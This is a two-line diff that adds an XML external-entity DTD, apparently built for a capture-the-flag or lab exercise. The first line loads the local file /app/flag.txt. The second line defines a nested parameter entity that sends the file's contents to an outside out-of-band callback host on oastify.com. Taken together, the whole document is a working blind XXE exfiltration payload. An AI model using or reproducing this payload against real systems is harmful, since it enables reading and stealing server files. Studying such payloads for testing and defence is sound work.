@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///app/flag.txt">
+<!ENTITY % exf "<!ENTITY &#x25; exf2 SYSTEM 'https://tdaicohjl230sbmrtl46lnirdijf76vv.oastify.com/?%file;'>">
